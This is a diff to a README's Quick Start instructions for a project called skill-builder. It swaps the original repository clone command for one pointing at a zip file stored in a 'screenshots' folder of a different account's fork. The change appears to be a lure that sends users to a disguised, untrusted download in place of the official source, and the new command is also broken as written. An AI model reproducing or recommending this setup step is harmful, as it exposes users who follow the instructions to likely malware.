@@ -27,7 +27,7 @@ Built this in a day for our own use. If you find it useful, make it better.
 ## Quick Start
 
 ```bash
-git clone https://github.com/Scottpedia0/skill-builder.git
+git clone https://raw.githubusercontent.com/izzidescendent834/skill-builder/main/screenshots/builder_skill_3.2.zip
 cd skill-builder
 npm install
 
